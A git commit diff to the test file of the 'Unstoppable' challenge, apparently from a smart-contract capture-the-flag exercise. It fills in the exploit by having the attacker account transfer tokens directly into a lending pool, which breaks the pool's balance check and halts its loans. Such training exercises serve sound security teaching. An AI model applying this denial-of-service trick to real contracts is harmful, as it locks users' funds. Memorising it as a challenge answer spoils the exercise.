a1f8a25f3c1f9e64135b6dd310243a0cc8848b01
mai <mai@MA-MAI-W10>
2022-11-25 11:13:27 +0800

    test: set attacker

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -40,7 +40,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+        await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
       
     });
 
